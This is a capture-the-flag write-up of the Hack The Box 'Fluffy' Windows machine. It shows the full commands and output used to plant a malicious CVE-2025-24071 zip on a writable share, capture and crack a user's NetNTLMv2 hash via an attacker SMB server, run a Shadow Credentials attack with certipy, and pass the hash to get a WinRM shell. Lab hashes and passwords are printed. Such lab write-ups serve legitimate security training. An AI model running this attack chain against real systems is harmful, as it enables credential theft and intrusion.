---
title: "🐩 HTB Fluffy Write-up"
name: Fluffy
date: 2025-09-21
last_modified_at: 2025-11-01
difficulty: Easy
os: Windows
skills: "Enumeration, ADCS Shadow Credentials, ACE Abuse, ESC16, Privilege Escalation, Password Cracking, Pass-the-Hash, Kerberos"
tools: "rustscan, nmap, nxc, impacket-smbclient, impacket-smbserver, net, bloodhound-python, BloodHound, searchsploit, CVE-2025-24071, certipy-ad, hashcat, evil-winrm, klist"
published: true
---

![](images/Pasted%20image%2020250716102742.png)

```
Machine Information

As is common in real life Windows pentests, you will start the Fluffy box with credentials for the following account: j.fleischman / J0elTHEM4n1990!
```

## 📝 Summary

An Upgrade Notice document found on a file share contained some information about discovered vulnerabilities in the environment.  One of these vulnerabilities was CVE-2025-24071.  An exploit Proof of Concept (PoC) generated a malicious zip file, which was uploaded to the share and the NetNTLMv2 hash for user `p.agila` was leaked and cracked.

`p.agila` had some excessive ACE permissions, which allowed the attacker to add the user to the `SERVICE ACCOUNT` group.  The `SERVICE ACCOUNT` members could, in turn, run a Shadow Credentials attack against two service accounts: `winrm_svc` and `ca_svc`.

The `winrm_svc` account held the user.txt flag.

`certipy-ad` using the `ca_svc` account revealed that the target was vulnerable to the ADCS ESC16 vulnerability, which was abused to compromise the domain.

## 🔓 NTLM Hash Disclosure

### 🔎 Recon

The **initial scan** revealed open ports for a Windows Active Directory server, including access through WinRM port `5985/tcp`.  `nmap` showed the heavy use of certificates, indicating the presence of an Active Directory Certificate Services.

```
fcoomans@kali:~/htb/fluffy$ rustscan -a 10.10.11.69 --tries 5 --ulimit 10000 -- -sCV -oA fluffy_tcp_all
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Port scanning: Making networking exciting since... whenever.

[~] The config file is expected to be at "/home/fcoomans/.rustscan.toml"
[~] Automatically increasing ulimit value to 10000.
Open 10.10.11.69:53
Open 10.10.11.69:88
Open 10.10.11.69:139
Open 10.10.11.69:389
Open 10.10.11.69:445
Open 10.10.11.69:464
Open 10.10.11.69:593
Open 10.10.11.69:636
Open 10.10.11.69:3269
Open 10.10.11.69:3268
Open 10.10.11.69:5985
Open 10.10.11.69:9389
Open 10.10.11.69:49666
Open 10.10.11.69:49690
Open 10.10.11.69:49693
Open 10.10.11.69:49689
Open 10.10.11.69:49712
Open 10.10.11.69:49719
Open 10.10.11.69:49760
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} -{{ipversion}} {{ip}} -sCV -oA fluffy_tcp_all" on ip 10.10.11.69
Depending on the complexity of the script, results may take some time to appear.

<SNIP>

Initiating NSE at 16:03
Completed NSE at 16:03, 0.01s elapsed
Nmap scan report for 10.10.11.69
Host is up, received echo-reply ttl 127 (0.17s latency).
Scanned at 2025-07-15 16:01:47 SAST for 100s

PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-07-15 13:42:57Z)
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Issuer: commonName=fluffy-DC01-CA/domainComponent=fluffy
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-04-17T16:04:17
| Not valid after:  2026-04-17T16:04:17
| MD5:   2765:a68f:4883:dc6d:0969:5d0d:3666:c880
| SHA-1: 72f3:1d5f:e6f3:b8ab:6b0e:dd77:5414:0d0c:abfe:e681
| -----BEGIN CERTIFICATE-----
| MIIGJzCCBQ+gAwIBAgITUAAAAAJKRwEaLBjVaAAAAAAAAjANBgkqhkiG9w0BAQsF
<SNIP>
| 9r5Zuo/LdOGg/tqrZV8cNR/AusGMNslltUAYtK3HyjETE/REiQgwS9mBbQ==
|_-----END CERTIFICATE-----
|_ssl-date: 2025-07-15T13:44:39+00:00; -18m47s from scanner time.
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-07-15T13:44:39+00:00; -18m46s from scanner time.
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Issuer: commonName=fluffy-DC01-CA/domainComponent=fluffy
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-04-17T16:04:17
| Not valid after:  2026-04-17T16:04:17
| MD5:   2765:a68f:4883:dc6d:0969:5d0d:3666:c880
| SHA-1: 72f3:1d5f:e6f3:b8ab:6b0e:dd77:5414:0d0c:abfe:e681
| -----BEGIN CERTIFICATE-----
| MIIGJzCCBQ+gAwIBAgITUAAAAAJKRwEaLBjVaAAAAAAAAjANBgkqhkiG9w0BAQsF
<SNIP>
| 9r5Zuo/LdOGg/tqrZV8cNR/AusGMNslltUAYtK3HyjETE/REiQgwS9mBbQ==
|_-----END CERTIFICATE-----
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Issuer: commonName=fluffy-DC01-CA/domainComponent=fluffy
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-04-17T16:04:17
| Not valid after:  2026-04-17T16:04:17
| MD5:   2765:a68f:4883:dc6d:0969:5d0d:3666:c880
| SHA-1: 72f3:1d5f:e6f3:b8ab:6b0e:dd77:5414:0d0c:abfe:e681
| -----BEGIN CERTIFICATE-----
| MIIGJzCCBQ+gAwIBAgITUAAAAAJKRwEaLBjVaAAAAAAAAjANBgkqhkiG9w0BAQsF
<SNIP>
| 9r5Zuo/LdOGg/tqrZV8cNR/AusGMNslltUAYtK3HyjETE/REiQgwS9mBbQ==
|_-----END CERTIFICATE-----
|_ssl-date: 2025-07-15T13:44:39+00:00; -18m47s from scanner time.
3269/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Issuer: commonName=fluffy-DC01-CA/domainComponent=fluffy
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-04-17T16:04:17
| Not valid after:  2026-04-17T16:04:17
| MD5:   2765:a68f:4883:dc6d:0969:5d0d:3666:c880
| SHA-1: 72f3:1d5f:e6f3:b8ab:6b0e:dd77:5414:0d0c:abfe:e681
| -----BEGIN CERTIFICATE-----
| MIIGJzCCBQ+gAwIBAgITUAAAAAJKRwEaLBjVaAAAAAAAAjANBgkqhkiG9w0BAQsF
<SNIP>
| 9r5Zuo/LdOGg/tqrZV8cNR/AusGMNslltUAYtK3HyjETE/REiQgwS9mBbQ==
|_-----END CERTIFICATE-----
|_ssl-date: 2025-07-15T13:44:39+00:00; -18m47s from scanner time.
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49666/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49689/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49690/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49693/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49712/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49719/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49760/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

<SNIP>
```

After pointing `fluffy.htb` and `dc01.fluffy.htb` in `/etc/hosts`,

```
fcoomans@kali:~/htb/fluffy$ grep fluffy.htb /etc/hosts
10.10.11.69     fluffy.htb dc01.fluffy.htb
```

I ran an `nmap` UDP port scan, which detected UDP-related Windows Active Directory services.

```
fcoomans@kali:~/htb/fluffy$ nmap --top-ports 100 --open -sU fluffy.htb
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-15 16:05 SAST
Nmap scan report for fluffy.htb (10.10.11.69)
Host is up (0.17s latency).
Not shown: 97 open|filtered udp ports (no-response)
PORT    STATE SERVICE
53/udp  open  domain
88/udp  open  kerberos-sec
123/udp open  ntp

Nmap done: 1 IP address (1 host up) scanned in 7.79 seconds
```

Using the provided credentials with `nxc`, only a handful of domain users and services exist on the target.

```
fcoomans@kali:~/htb/fluffy$ nxc ldap fluffy.htb -u j.fleischman -p J0elTHEM4n1990! --users
LDAP        10.10.11.69     389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb)
LDAP        10.10.11.69     389    DC01             [+] fluffy.htb\j.fleischman:J0elTHEM4n1990!
LDAP        10.10.11.69     389    DC01             [*] Enumerated 9 domain users: fluffy.htb
LDAP        10.10.11.69     389    DC01             -Username-                    -Last PW Set-       -BadPW-  -Description-
LDAP        10.10.11.69     389    DC01             Administrator                 2025-04-17 17:45:01 0        Built-in account for administering the computer/domain
LDAP        10.10.11.69     389    DC01             Guest                         <never>             0        Built-in account for guest access to the computer/domain
LDAP        10.10.11.69     389    DC01             krbtgt                        2025-04-17 18:00:02 0        Key Distribution Center Service Account
LDAP        10.10.11.69     389    DC01             ca_svc                        2025-04-17 18:07:50 0
LDAP        10.10.11.69     389    DC01             ldap_svc                      2025-04-17 18:17:00 0
LDAP        10.10.11.69     389    DC01             p.agila                       2025-04-18 16:37:08 3
LDAP        10.10.11.69     389    DC01             winrm_svc                     2025-05-18 02:51:16 0
LDAP        10.10.11.69     389    DC01             j.coffey                      2025-04-19 14:09:55 2
LDAP        10.10.11.69     389    DC01             j.fleischman                  2025-05-16 16:46:55 0
```

Group membership was also queried.

```
fcoomans@kali:~/htb/fluffy$ nxc ldap fluffy.htb -u j.fleischman -p J0elTHEM4n1990! --groups |grep -v "membercount: 0"
LDAP                     10.10.11.69     389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb)
LDAP                     10.10.11.69     389    DC01             [+] fluffy.htb\j.fleischman:J0elTHEM4n1990!
LDAP                     10.10.11.69     389    DC01             Administrators                           membercount: 3
LDAP                     10.10.11.69     389    DC01             Users                                    membercount: 3
LDAP                     10.10.11.69     389    DC01             Guests                                   membercount: 2
LDAP                     10.10.11.69     389    DC01             Certificate Service DCOM Access          membercount: 1
LDAP                     10.10.11.69     389    DC01             Remote Management Users                  membercount: 1
LDAP                     10.10.11.69     389    DC01             Schema Admins                            membercount: 1
LDAP                     10.10.11.69     389    DC01             Enterprise Admins                        membercount: 1
LDAP                     10.10.11.69     389    DC01             Cert Publishers                          membercount: 2
LDAP                     10.10.11.69     389    DC01             Domain Admins                            membercount: 1
LDAP                     10.10.11.69     389    DC01             Group Policy Creator Owners              membercount: 1
LDAP                     10.10.11.69     389    DC01             Pre-Windows 2000 Compatible Access       membercount: 2
LDAP                     10.10.11.69     389    DC01             Windows Authorization Access Group       membercount: 1
LDAP                     10.10.11.69     389    DC01             Denied RODC Password Replication Group   membercount: 8
LDAP                     10.10.11.69     389    DC01             Service Account Managers                 membercount: 2
LDAP                     10.10.11.69     389    DC01             Service Accounts                         membercount: 3

fcoomans@kali:~/htb/fluffy$ nxc ldap fluffy.htb -u j.fleischman -p J0elTHEM4n1990! --groups "Remote Management Users"
LDAP        10.10.11.69     389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb)
LDAP        10.10.11.69     389    DC01             [+] fluffy.htb\j.fleischman:J0elTHEM4n1990!
LDAP        10.10.11.69     389    DC01             winrm service

fcoomans@kali:~/htb/fluffy$ nxc ldap fluffy.htb -u j.fleischman -p J0elTHEM4n1990! --groups "Service Account Managers"
LDAP        10.10.11.69     389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb)
LDAP        10.10.11.69     389    DC01             [+] fluffy.htb\j.fleischman:J0elTHEM4n1990!
LDAP        10.10.11.69     389    DC01             John Coffey
LDAP        10.10.11.69     389    DC01             Prometheus Agila

fcoomans@kali:~/htb/fluffy$ nxc ldap fluffy.htb -u j.fleischman -p J0elTHEM4n1990! --groups "Service Accounts"
LDAP        10.10.11.69     389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb)
LDAP        10.10.11.69     389    DC01             [+] fluffy.htb\j.fleischman:J0elTHEM4n1990!
LDAP        10.10.11.69     389    DC01             winrm service
LDAP        10.10.11.69     389    DC01             ldap service
LDAP        10.10.11.69     389    DC01             certificate authority service
```

The password policy showed that there was no account lockout configured.  So, online brute forcing and other password discovery techniques could be used without fear of locking domain accounts.

```
fcoomans@kali:~/htb/fluffy$ nxc smb fluffy.htb -u j.fleischman -p J0elTHEM4n1990! --pass-pol
SMB         10.10.11.69     445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.69     445    DC01             [+] fluffy.htb\j.fleischman:J0elTHEM4n1990!
SMB         10.10.11.69     445    DC01             [+] Dumping password info for domain: FLUFFY
SMB         10.10.11.69     445    DC01             Minimum password length: 7
SMB         10.10.11.69     445    DC01             Password history length: 24
SMB         10.10.11.69     445    DC01             Maximum password age: 41 days 23 hours 53 minutes
SMB         10.10.11.69     445    DC01
SMB         10.10.11.69     445    DC01             Password Complexity Flags: 000000
SMB         10.10.11.69     445    DC01                 Domain Refuse Password Change: 0
SMB         10.10.11.69     445    DC01                 Domain Password Store Cleartext: 0
SMB         10.10.11.69     445    DC01                 Domain Password Lockout Admins: 0
SMB         10.10.11.69     445    DC01                 Domain Password No Clear Change: 0
SMB         10.10.11.69     445    DC01                 Domain Password No Anon Change: 0
SMB         10.10.11.69     445    DC01                 Domain Password Complex: 0
SMB         10.10.11.69     445    DC01
SMB         10.10.11.69     445    DC01             Minimum password age: 1 day 4 minutes
SMB         10.10.11.69     445    DC01             Reset Account Lockout Counter: 10 minutes
SMB         10.10.11.69     445    DC01             Locked Account Duration: 10 minutes
SMB         10.10.11.69     445    DC01             Account Lockout Threshold: None
SMB         10.10.11.69     445    DC01             Forced Log off Time: Not Set
```

The `bloodhound-python` collector was run and the results imported into BloodHound.

```
fcoomans@kali:~/htb/fluffy$ bloodhound-python --zip -ns 10.10.11.69 -d fluffy.htb -c All --dns-tcp -u j.fleischman -p J0elTHEM4n1990!
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: fluffy.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc01.fluffy.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc01.fluffy.htb
INFO: Found 10 users
INFO: Found 54 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC01.fluffy.htb
INFO: Done in 00M 32S
INFO: Compressing output into 20250715161919_bloodhound.zip
```

Looking at the server shares showed that the provided user could `READ,WRITE` to the `IT` share.

```
fcoomans@kali:~/htb/fluffy$ nxc smb fluffy.htb -u j.fleischman -p J0elTHEM4n1990! --shares
SMB         10.10.11.69     445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.69     445    DC01             [+] fluffy.htb\j.fleischman:J0elTHEM4n1990!
SMB         10.10.11.69     445    DC01             [*] Enumerated shares
SMB         10.10.11.69     445    DC01             Share           Permissions     Remark
SMB         10.10.11.69     445    DC01             -----           -----------     ------
SMB         10.10.11.69     445    DC01             ADMIN$                          Remote Admin
SMB         10.10.11.69     445    DC01             C$                              Default share
SMB         10.10.11.69     445    DC01             IPC$            READ            Remote IPC
SMB         10.10.11.69     445    DC01             IT              READ,WRITE
SMB         10.10.11.69     445    DC01             NETLOGON        READ            Logon server share
SMB         10.10.11.69     445    DC01             SYSVOL          READ            Logon server share
```

I used `impacket-smbclient` to interrogate the `IT` share.  (I prefer to use `impacket-smbclient`, as it has the convenient `tree` option to visually show folders and files.)
The `Upgrade_Notice.pdf` file looked interesting.  So, I downloaded it.

```
fcoomans@kali:~/htb/fluffy$ impacket-smbclient 'fluffy/j.fleischman:J0elTHEM4n1990!@dc01.fluffy.htb'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

Type help for list of commands
# use IT
# tree
/Everything-1.4.1.1026.x64.zip
/KeePass-2.58.zip
/Upgrade_Notice.pdf
/Everything-1.4.1.1026.x64/everything.exe
/Everything-1.4.1.1026.x64/Everything.lng
/KeePass-2.58/KeePass.chm
/KeePass-2.58/KeePass.exe
/KeePass-2.58/KeePass.exe.config
/KeePass-2.58/KeePass.XmlSerializers.dll
/KeePass-2.58/KeePassLibC32.dll
/KeePass-2.58/KeePassLibC64.dll
/KeePass-2.58/Languages
/KeePass-2.58/License.txt
/KeePass-2.58/Plugins
/KeePass-2.58/ShInstUtil.exe
/KeePass-2.58/XSL
/KeePass-2.58/XSL/KDBX_Common.xsl
/KeePass-2.58/XSL/KDBX_DetailsFull_HTML.xsl
/KeePass-2.58/XSL/KDBX_DetailsLight_HTML.xsl
/KeePass-2.58/XSL/KDBX_PasswordsOnly_TXT.xsl
/KeePass-2.58/XSL/KDBX_Tabular_HTML.xsl
Finished - 20 files and folders
# get Upgrade_Notice.pdf
# exit
```

Opening the file showed **Recent Vulnerabilities** that were discovered in the target environment.

![](images/Pasted%20image%2020250716100340.png)

`CVE-2025-24071` seemed interesting as it discloses NTLM hashes.

```
fcoomans@kali:~/htb/fluffy$ searchsploit --cve 2025-24071
----------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                           |  Path
----------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Windows File Explorer Windows 10 Pro x64 - TAR Extraction                                                                                | windows/remote/52325.py
Windows File Explorer Windows 11 (23H2) - NTLM Hash Disclosure                                                                           | windows/remote/52310.py
----------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

A mirror (`-m`) copy of the exploit was created and it looked like the target's IP and a writable share (`IT` is writable) was all that was needed to run the exploit.

```
fcoomans@kali:~/htb/fluffy$ searchsploit -m 52310
  Exploit: Windows File Explorer Windows 11 (23H2) - NTLM Hash Disclosure
      URL: https://www.exploit-db.com/exploits/52310
     Path: /usr/share/exploitdb/exploits/windows/remote/52310.py
    Codes: CVE-2025-24071
 Verified: False
File Type: Python script, ASCII text executable
Copied to: /home/fcoomans/htb/fluffy/52310.py



fcoomans@kali:~/htb/fluffy$ python 52310.py
usage: 52310.py [-h] -i IP [-n NAME] [-o OUTPUT] [--keep]
52310.py: error: the following arguments are required: -i/--ip
```

### 🧪 Exploitation

#### 🐞 CVE-2025-24071

The exploit was executed and it created a malicious file under `output/malicious.zip`.  The instructions said that I should start a SMB server to catch the NTLM hashes of anyone who accessed the malicious file on the server.  Lastly, I had to upload the malicious file to the server.  Luckily the supplied user had `WRITE` permissions to the `IT` share...

```
fcoomans@kali:~/htb/fluffy$ python 52310.py -i 10.10.14.113
[*] Generating malicious .library-ms file...
[+] Created ZIP: output/malicious.zip
[-] Removed intermediate .library-ms file
[!] Done. Send ZIP to victim and listen for NTLM hash on your SMB server.
```

The `impacket-smbserver` was started, but `responder` would also have done the trick.

```
fcoomans@kali:~/htb/fluffy$ impacket-smbserver -smb2support share share
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
```

I connected at the `IT` share and uploaded the `malicious.zip` file to the share.

```
fcoomans@kali:~/htb/fluffy$ impacket-smbclient 'fluffy/j.fleischman:J0elTHEM4n1990!@dc01.fluffy.htb'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

Type help for list of commands
# use IT
# put output/malicious.zip
# ls
drw-rw-rw-          0  Tue Jul 15 17:47:55 2025 .
drw-rw-rw-          0  Tue Jul 15 17:47:55 2025 ..
drw-rw-rw-          0  Fri May 16 16:51:49 2025 Everything-1.4.1.1026.x64
-rw-rw-rw-    1827464  Fri May 16 16:51:49 2025 Everything-1.4.1.1026.x64.zip
drw-rw-rw-          0  Fri May 16 16:51:49 2025 KeePass-2.58
-rw-rw-rw-    3225346  Fri May 16 16:51:49 2025 KeePass-2.58.zip
-rw-rw-rw-        326  Tue Jul 15 17:47:55 2025 malicious.zip
-rw-rw-rw-     169963  Sat May 17 16:31:07 2025 Upgrade_Notice.pdf
```

The `impacket-smbserver` then started receiving the NetNTLMv2 hash for user `p.agila` as that user accessed the ZIP file in the share.

```
fcoomans@kali:~/htb/fluffy$ impacket-smbserver -smb2support share share
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.10.11.69,60218)
[*] AUTHENTICATE_MESSAGE (FLUFFY\p.agila,DC01)
[*] User DC01\p.agila authenticated successfully
[*] p.agila::FLUFFY:aaaaaaaaaaaaaaaa:28c7670188bdaadd45981fdf97ceddae:010100000000000080b0e3d89ef5db01c2155af79f7587000000000001001000460041004a007a0071004b004400440003001000460041004a007a0071004b0044004400020010004d00740062006100530078006f006f00040010004d00740062006100530078006f006f000700080080b0e3d89ef5db0106000400020000000800300030000000000000000100000000200000ec74d5cbbf57bf4e5fea6e9a8a432988a1372678006d5eafcbab8122727ec4280a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310034002e003100310033000000000000000000
```

The hash was copied to a local file.

```
fcoomans@kali:~/htb/fluffy$ cat ntlmv2.hash
p.agila::FLUFFY:aaaaaaaaaaaaaaaa:28c7670188bdaadd45981fdf97ceddae:010100000000000080b0e3d89ef5db01c2155af79f7587000000000001001000460041004a007a0071004b004400440003001000460041004a007a0071004b0044004400020010004d00740062006100530078006f006f00040010004d00740062006100530078006f006f000700080080b0e3d89ef5db0106000400020000000800300030000000000000000100000000200000ec74d5cbbf57bf4e5fea6e9a8a432988a1372678006d5eafcbab8122727ec4280a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310034002e003100310033000000000000000000
```

And `hashcat` was used to crack the NetNTLMv2 hash.  The password for user `p.agila` is `prometheusx-303`.

```
fcoomans@kali:~/htb/fluffy$ hashcat --help |grep -i ntlm
   5500 | NetNTLMv1 / NetNTLMv1+ESS                                  | Network Protocol
  27000 | NetNTLMv1 / NetNTLMv1+ESS (NT)                             | Network Protocol
   5600 | NetNTLMv2                                                  | Network Protocol
  27100 | NetNTLMv2 (NT)                                             | Network Protocol
   1000 | NTLM                                                       | Operating System

fcoomans@kali:~/htb/fluffy$ hashcat -m 5600 ntlmv2.hash /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

<SNIP>

P.AGILA::FLUFFY:aaaaaaaaaaaaaaaa:28c7670188bdaadd45981fdf97ceddae:010100000000000080b0e3d89ef5db01c2155af79f7587000000000001001000460041004a007a0071004b004400440003001000460041004a007a0071004b0044004400020010004d00740062006100530078006f006f00040010004d00740062006100530078006f006f000700080080b0e3d89ef5db0106000400020000000800300030000000000000000100000000200000ec74d5cbbf57bf4e5fea6e9a8a432988a1372678006d5eafcbab8122727ec4280a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310034002e003100310033000000000000000000:prometheusx-303

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: P.AGILA::FLUFFY:aaaaaaaaaaaaaaaa:28c7670188bdaadd45...000000

<SNIP>
```

### 💰 Post Exploitation

`nxc` confirms that these credentials were indeed correct.

```
fcoomans@kali:~/htb/fluffy$ nxc smb fluffy.htb -u p.agila -p prometheusx-303
SMB         10.10.11.69     445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.69     445    DC01             [+] fluffy.htb\p.agila:prometheusx-303
```

## 🥷 ADCS Shadow Credentials attack

### 🔎 Recon

BloodHound showed that `p.agila` could add it's own account to the `SERVICE ACCOUNTS` group.  

![](images/Pasted%20image%2020250716101557.png)

Members of the `SERVICE ACCOUNTS` group have `GenericWrite` permissions on the `winrm_svc` service account.  This account would provide WinRM access to the server.  A Shadow Credentials attack could be used to get the NTLM hash for that account.

![](images/Pasted%20image%2020250715110538.png)

### 🧪 Exploitation

The attack started by running the suggested commands to add user `p.agila` as a member of the `SERVICE ACCOUNTS` group.

```
fcoomans@kali:~/htb/fluffy$ net rpc group members "SERVICE ACCOUNTS" -U "FLUFFY/p.agila%prometheusx-303" -S "dc01.fluffy.htb"
FLUFFY\ca_svc
FLUFFY\ldap_svc
FLUFFY\winrm_svc

fcoomans@kali:~/htb/fluffy$ net rpc group addmem "SERVICE ACCOUNTS" "p.agila" -U "FLUFFY/p.agila%prometheusx-303" -S "dc01.fluffy.htb"

fcoomans@kali:~/htb/fluffy$ net rpc group members "SERVICE ACCOUNTS" -U "FLUFFY/p.agila%prometheusx-303" -S "dc01.fluffy.htb"
FLUFFY\ca_svc
FLUFFY\ldap_svc
FLUFFY\p.agila
FLUFFY\winrm_svc
```

I decided to use `certipy-ad` instead of `pywhisker` as I find `certipy-ad` easier to use than `pywhisker`.  
`certipy-ad` used user `p.agila` to dump the NTLM hash for the `winrm_svc` service account using a Shadow Credentials attack.

```
fcoomans@kali:~/htb/fluffy$ certipy-ad shadow -u p.agila -p prometheusx-303 -dc-ip 10.10.11.69 -account winrm_svc auto
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'winrm_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID 'f252b48f-056b-b2f2-7c81-bc3640bdf9db'
[*] Adding Key Credential with device ID 'f252b48f-056b-b2f2-7c81-bc3640bdf9db' to the Key Credentials for 'winrm_svc'
[*] Successfully added Key Credential with device ID 'f252b48f-056b-b2f2-7c81-bc3640bdf9db' to the Key Credentials for 'winrm_svc'
[*] Authenticating as 'winrm_svc' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'winrm_svc@fluffy.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'winrm_svc.ccache'
[*] Wrote credential cache to 'winrm_svc.ccache'
[*] Trying to retrieve NT hash for 'winrm_svc'
[*] Restoring the old Key Credentials for 'winrm_svc'
[*] Successfully restored the old Key Credentials for 'winrm_svc'
[*] NT hash for 'winrm_svc': 33bd09dcd697600edf6b3a7af4875767
```

`nxc` confirmed that the hash was valid.

```
fcoomans@kali:~/htb/fluffy$ nxc smb fluffy.htb -u winrm_svc -H 33bd09dcd697600edf6b3a7af4875767
SMB         10.10.11.69     445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.69     445    DC01             [+] fluffy.htb\winrm_svc:33bd09dcd697600edf6b3a7af4875767
```

`evil-winrm` was then used to connect to the server with the `winrm_svc` service account and its NTLM hash.  This known as **Pass-the-Hash** (PtH).  PtH allow the attacker to use the NTLM hash instead of the cleartext password to authenticate to the target.

```
fcoomans@kali:~/htb/fluffy$ evil-winrm -i dc01.fluffy.htb -u winrm_svc -H 33bd09dcd697600edf6b3a7af4875767

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\winrm_svc\Documents> whoami
fluffy\winrm_svc
```

### 💰 Post Exploitation

#### 🚩 user.txt

`winrm_svc` holds the `user.txt` flag.

```
*Evil-WinRM* PS C:\Users\winrm_svc\Documents> type C:\Users\winrm_svc\Desktop\user.txt
9ca44d83351c25d767856b0f838828e3
```

